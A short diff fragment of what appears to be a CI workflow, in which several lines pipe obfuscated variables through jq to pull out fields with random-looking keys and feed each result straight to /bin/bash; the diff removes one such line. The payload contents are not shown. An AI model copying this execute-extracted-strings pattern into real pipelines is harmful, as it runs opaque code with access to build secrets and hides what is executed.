@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$yfliq44639" | jq -r .a46067 | /bin/bash
           printf '%s' "$s197" | jq -r .zpm9179 | /bin/bash
           echo $qg45796 | jq -r .bc548 | /bin/bash
-          echo $is48 | jq -r .vpwgs0923 | /bin/bash
           echo $fv79 | jq -r .g277 | /bin/bash
           echo $wrgp7 | jq -r .vmfty9161 | /bin/bash
 
